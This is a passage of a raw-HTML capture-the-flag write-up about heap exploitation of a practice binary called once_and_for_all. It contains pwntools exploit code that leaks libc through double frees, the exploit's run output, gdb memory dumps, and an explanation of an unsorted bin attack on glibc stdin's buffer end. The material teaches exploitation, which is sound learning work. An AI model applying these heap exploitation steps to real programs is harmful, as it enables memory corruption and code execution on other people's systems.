freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# falls into the unsortedbin&lt;/span&gt;

show(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ebca0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# offset of the unsorted bin&lt;/span&gt;

stdin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3eba00&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608560:	0x0000000000000000	0x0000000000000041
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608570:	0x00005555556085a0	0x4141414141414141
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608580:	0x4141414141414141	0x4141414141414141
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608590:	0x4141414141414141	0x4141414141414141
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085a0:	0x0a41414141414141	0x0000000000000041
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085b0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085c0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085d0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085e0:	0x0000000000000000	0x00000000000000b1
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608600:	0x4343434343434343	0x4343434343434343
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608610:	0x0a43434343434343	0x0000000000000041
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608620:	0x4444444444444444	0x4444444444444444
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608630:	0x000000000000000a	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608640:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608650:	0x0000000000000000	0x0000000000000031
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608660:	0x4545454545454545	0x4545454545454545
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608670:	0x4545454545454545	0x4545454545454545
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608680:	0x0a45454545454545	0x0000000000000031
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608690:	0x00000000000000b0	0x0000000000000020
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086a0:	0x000000000000000a	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086b0:	0x0000000000000000	0x0000000000020951
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;unsortedbin
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;tcachebins
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which gives:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Debugging process with ASLR disabled
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/bin/gdbserver&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;31378&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; running in new terminal: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/bin/gdb&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-q&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/tmp/pwn1z_5e0ie.gdb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; libc: 0x7ffff79e4000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We now have achieved the first step of the challenge: leak the libc base address.&lt;/p&gt;
&lt;h2 id=&#34;what-can-we-target-in-the-libc-&#34;&gt;What can we target in the libc ?&lt;/h2&gt;
&lt;p&gt;There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack &lt;code&gt;_IO_stdin&lt;/code&gt; by running an unsorted bin attack on its &lt;code&gt;_IO_buf_end&lt;/code&gt; field which holds the end of the internal buffer of &lt;code&gt;stdin&lt;/code&gt; from &lt;code&gt;_IO_buf_base&lt;/code&gt;, according to the &lt;a href=&#34;https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469&#34;&gt;glibc source code&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;_IO_new_file_underflow&lt;/span&gt; (_IO_FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp)
{
  _IO_ssize_t count;
&lt;span style=&#34;color:#75715e&#34;&gt;#if 0&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  /* SysV does not make this test; take it out for compatibility */
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  if (fp-&amp;gt;_flags &amp;amp; _IO_EOF_SEEN)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    return (EOF);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; _IO_NO_READS)
    {
      fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_ERR_SEEN;
      __set_errno (EBADF);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; EOF;
    }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
    {
      &lt;span style=&#34;color:#75715e&#34;&gt;/* Maybe we already have a push back pointer.  */&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_save_base &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
	{
	  free (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_save_base);
	  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  &lt;span style=&#34;color:#75715e&#34;&gt;/* Flush all line buffered files before reading. */&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;/* FIXME This can/should be moved to genops ?? */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (_IO_LINE_BUF&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;_IO_UNBUFFERED))
    {
&lt;span style=&#34;color:#75715e&#34;&gt;#if 0&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;      _IO_flush_all_linebuffered ();
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#else
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#75715e&#34;&gt;/* We used to flush all line-buffered stream.  This really isn&amp;#39;t
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 required by any standard.  My recollection is that
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 traditional Unix systems did this for stdout.  stderr better
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 not be line buffered.  So we do just that here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 explicitly.  --drepper */&lt;/span&gt;
      _IO_acquire_lock (_IO_stdout);

      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((_IO_stdout&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (_IO_LINKED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_NO_WRITES &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_LINE_BUF))
	  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (_IO_LINKED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }

  _IO_switch_to_get_mode (fp);

  &lt;span style=&#34;color:#75715e&#34;&gt;/* This is very tricky. We have to adjust those
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     pointers before we call _IO_SYSREAD () since
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     we may longjump () out while waiting for
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     input. Those pointers may be screwed up. H.J. */&lt;/span&gt;
  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;
  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;
  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_end
    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;

  count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_SYSREAD (fp, fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base,
		       fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
	fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_EOF_SEEN;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
	fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_ERR_SEEN, count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  }
  fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; count;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (count &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    {
      &lt;span style=&#34;color:#75715e&#34;&gt;/* If a stream is read to EOF, the calling application may switch active
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 handles.  As a result, our offset cache would no longer be valid, so
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 unset it.  */&lt;/span&gt;
      fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_pos_BAD;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; EOF;
    }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; _IO_pos_BAD)
    _IO_pos_adjust (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset, count);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The interesting part is the &lt;code&gt;count = _IO_SYSREAD (fp, fp-&amp;gt;_IO_buf_base, fp-&amp;gt;_IO_buf_end - fp-&amp;gt;_IO_buf_base);&lt;/code&gt; which reads &lt;code&gt;fp-&amp;gt;_IO_buf_end - fp-&amp;gt;_IO_buf_base&lt;/code&gt; bytes in &lt;code&gt;fp-&amp;gt;_IO_buf_base&lt;/code&gt;. Which means if &lt;code&gt;fp-&amp;gt;_IO_buf_end&lt;/code&gt; is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that &lt;code&gt;&amp;amp;unsorted bin &amp;gt; fp-&amp;gt;_IO_buf_base&lt;/code&gt;, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what&amp;rsquo;s actually going on:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pwndbg&amp;gt; x/100gx stdin
0x7ffff7dcfa00 &amp;lt;_IO_2_1_stdin_&amp;gt;:	0x00000000fbad208b	0x00007ffff7dcfa83
0x7ffff7dcfa10 &amp;lt;_IO_2_1_stdin_+16&amp;gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa20 &amp;lt;_IO_2_1_stdin_+32&amp;gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa30 &amp;lt;_IO_2_1_stdin_+48&amp;gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa40 &amp;lt;_IO_2_1_stdin_+64&amp;gt;:	0x00007ffff7dcfa84	0x0000000000000000
0x7ffff7dcfa50 &amp;lt;_IO_2_1_stdin_+80&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa60 &amp;lt;_IO_2_1_stdin_+96&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa70 &amp;lt;_IO_2_1_stdin_+112&amp;gt;:	0x0000001000000000	0xffffffffffffffff
0x7ffff7dcfa80 &amp;lt;_IO_2_1_stdin_+128&amp;gt;:	0x000000000a000000	0x00007ffff7dd18d0
0x7ffff7dcfa90 &amp;lt;_IO_2_1_stdin_+144&amp;gt;:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dcfaa0 &amp;lt;_IO_2_1_stdin_+160&amp;gt;:	0x00007ffff7dcfae0	0x0000000000000000
0x7ffff7dcfab0 &amp;lt;_IO_2_1_stdin_+176&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfac0 &amp;lt;_IO_2_1_stdin_+192&amp;gt;:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dcfad0 &amp;lt;_IO_2_1_stdin_+208&amp;gt;:	0x0000000000000000	0x00007ffff7dcc2a0
0x7ffff7dcfae0 &amp;lt;_IO_wide_data_0&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfaf0 &amp;lt;_IO_wide_data_0+16&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb00 &amp;lt;_IO_wide_data_0+32&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb10 &amp;lt;_IO_wide_data_0+48&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb20 &amp;lt;_IO_wide_data_0+64&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb30 &amp;lt;_IO_wide_data_0+80&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb40 &amp;lt;_IO_wide_data_0+96&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb50 &amp;lt;_IO_wide_data_0+112&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb60 &amp;lt;_IO_wide_data_0+128&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb70 &amp;lt;_IO_wide_data_0+144&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb80 &amp;lt;_IO_wide_data_0+160&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb90 &amp;lt;_IO_wide_data_0+176&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfba0 &amp;lt;_IO_wide_data_0+192&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbb0 &amp;lt;_IO_wide_data_0+208&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbc0 &amp;lt;_IO_wide_data_0+224&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbd0 &amp;lt;_IO_wide_data_0+240&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbe0 &amp;lt;_IO_wide_data_0+256&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbf0 &amp;lt;_IO_wide_data_0+272&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc00 &amp;lt;_IO_wide_data_0+288&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc10 &amp;lt;_IO_wide_data_0+304&amp;gt;:	0x00007ffff7dcbd60	0x0000000000000000
0x7ffff7dcfc20 &amp;lt;__memalign_hook&amp;gt;:	0x00007ffff7a7b410	0x00007ffff7a7c790
0x7ffff7dcfc30 &amp;lt;__malloc_hook&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc40 &amp;lt;main_arena&amp;gt;:	0x0000000000000000	0x0000000000000001
0x7ffff7dcfc50 &amp;lt;main_arena+16&amp;gt;:	0x0000000000000000	0x00005555556085e0
0x7ffff7dcfc60 &amp;lt;main_arena+32&amp;gt;:	0x0000555555608560	0x0000000000000000
0x7ffff7dcfc70 &amp;lt;main_arena+48&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc80 &amp;lt;main_arena+64&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc90 &amp;lt;main_arena+80&amp;gt;:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfca0 &amp;lt;main_arena+96&amp;gt;:	0x00005555556086b0	&amp;lt;- &amp;amp;unsortedbin = 0x7ffff7dcfca0
pwndbg&amp;gt; p *stdin
$1 = {
  _flags = -72540021,
  _IO_read_ptr = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
  _IO_read_end = 0x7ffff7dcfa83 &amp;lt;_IO_2_1_stdin_+131&amp;gt; &amp;quot;\n&amp;quot;,
